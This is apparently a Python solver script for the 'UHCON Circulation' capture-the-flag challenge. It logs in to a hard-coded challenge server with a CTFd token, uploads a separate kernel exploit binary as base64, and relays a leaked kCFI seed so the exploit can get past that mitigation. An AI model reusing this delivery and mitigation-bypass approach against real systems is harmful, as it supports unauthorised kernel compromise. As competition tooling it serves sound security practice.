#!/usr/bin/env python3
"""Remote solver for UHCON Circulation.

The launcher uploads the adjacent static ``exploit`` binary, captures the
per-boot kCFI seed from the serial console, and relays it when the exploit asks.
"""

from __future__ import annotations

import argparse
import base64
import os
from pathlib import Path
import re
import socket
import sys
import time


DEFAULT_HOST = "43.203.150.218"
DEFAULT_PORT = 1337
FLAG_RE = re.compile(rb"(?:FLAG|UHCON|UHC)\{[^}\r\n]+\}")
SEED_RE = re.compile(rb"cfi_seed: 0x([0-9a-fA-F]{8})")


def emit(data: bytes, quiet: bool) -> None:
    if not quiet:
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()


def recv_until(
    sock: socket.socket,
    marker: bytes,
    timeout: float,
    transcript: bytearray,
    quiet: bool,
) -> None:
    deadline = time.monotonic() + timeout
    while marker not in transcript:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(f"timed out waiting for {marker!r}")
        sock.settimeout(min(remaining, 5.0))
        chunk = sock.recv(65536)
        if not chunk:
            raise EOFError(f"connection closed before {marker!r}")
        transcript.extend(chunk)
        emit(chunk, quiet)


def load_token(args: argparse.Namespace) -> str:
    if args.token:
        return args.token.strip()
    if args.token_file:
        return args.token_file.read_text(encoding="utf-8").strip()
    token = os.environ.get("UHCON_CTFD_TOKEN", "").strip()
    if token:
        return token
    raise SystemExit(
        "provide --token, --token-file, or the UHCON_CTFD_TOKEN environment variable"
    )


def main() -> int:
    root = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--token")
    parser.add_argument("--token-file", type=Path)
    parser.add_argument("--exploit", type=Path, default=root / "exploit")
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--transcript", type=Path, default=root / "remote.log")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    token = load_token(args)
    raw_exploit = args.exploit.read_bytes()
    encoded = base64.b64encode(raw_exploit)
    if len(encoded) > 8_000_000:
        raise SystemExit("base64 exploit exceeds the service limit")
    upload = b"\n".join(
        encoded[offset:offset + 76] for offset in range(0, len(encoded), 76)
    ) + b"\n\n"

    transcript = bytearray()
    seed: bytes | None = None
    seed_sent = False
    try:
        with socket.create_connection((args.host, args.port), timeout=15) as sock:
            recv_until(
                sock, b"CTFd access token: ", 20, transcript, args.quiet
            )
            sock.sendall(token.encode() + b"\n")
            recv_until(
                sock,
                b"base64 exploit, empty line to end:",
                90,
                transcript,
                args.quiet,
            )
            sock.sendall(upload)

            deadline = time.monotonic() + args.timeout
            while time.monotonic() < deadline:
                sock.settimeout(min(5.0, deadline - time.monotonic()))
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                transcript.extend(chunk)
                emit(chunk, args.quiet)

                window = bytes(transcript[-8192:])
                if seed is None:
                    match = SEED_RE.search(window)
                    if match:
                        seed = match.group(1)
                if seed is not None and not seed_sent and b"CFI_SEED_HEX?" in window:
                    sock.sendall(seed + b"\n")
                    seed_sent = True

                flag = FLAG_RE.search(transcript)
                if flag:
                    args.transcript.write_bytes(transcript)
                    value = flag.group(0).decode("ascii", "replace")
                    print(f"\n[+] {value}")
                    return 0
    finally:
        args.transcript.write_bytes(transcript)

    raise SystemExit(f"flag not found; transcript saved to {args.transcript}")


if __name__ == "__main__":
    raise SystemExit(main())
